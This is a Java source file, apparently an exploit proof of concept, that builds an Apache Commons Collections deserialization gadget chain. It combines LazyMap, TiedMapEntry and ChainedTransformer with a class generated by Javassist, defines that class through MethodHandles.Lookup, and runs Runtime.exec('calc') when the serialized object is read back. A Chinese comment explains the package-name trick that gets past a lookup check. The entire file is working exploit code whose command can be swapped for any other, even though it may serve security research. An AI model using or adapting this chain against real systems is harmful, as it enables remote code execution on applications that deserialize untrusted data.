package com.test;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.invoke.MethodHandles;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class Exp {
    public static void main(String[] args) throws CannotCompileException, IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.importPackage("java.io");
        // 调用者和被调用者的包名一致，才能通过java.lang.invoke.MethodHandles.Lookup.ClassFile.newInstance里的判断
        CtClass ctClass = pool.makeClass("org.apache.commons.collections.functors.Calc");
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody("        try {\n" +
                "            Runtime.getRuntime().exec(\"calc\");\n" +
                "        } catch (IOException e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }");
        ctClass.addConstructor(ctConstructor);
        byte[] bytecode = ctClass.toBytecode();
//        ctClass.writeFile("Calc.class");


        ConstantTransformer constantTransformer = new ConstantTransformer(MethodHandles.class);
        InvokerTransformer invokerTransformer1 = new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"lookup", new Class[]{}});
        InvokerTransformer invokerTransformer2 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}});
        InvokerTransformer invokerTransformer3 = new InvokerTransformer("defineClass", new Class[]{byte[].class}, new Object[]{bytecode});
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[0], new Object[0]);
//        ConstantTransformer constantTransformer1 = new ConstantTransformer(1);

        Transformer[] transformers = {constantTransformer,invokerTransformer1,invokerTransformer2,invokerTransformer3, instantiateTransformer};
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> inner = new HashMap<>();



        Map lazyMap = LazyMap.decorate(inner, new ConstantFactory("123"));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "useless");


        HashMap<Object, Object> finalMap = new HashMap<>();
        finalMap.put(tiedMapEntry, "any");
        inner.remove("useless");
        lazyMap.remove("useless");
        setFieldValue(lazyMap, "factory", chainedTransformer);


//        setFieldValue(chainedTransformer, "iTransformers", transformers);

        FileOutputStream fos = new FileOutputStream("mh.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(finalMap);
        oos.close();

        FileInputStream fis = new FileInputStream("mh.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();

    }

    public static void setFieldValue (Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
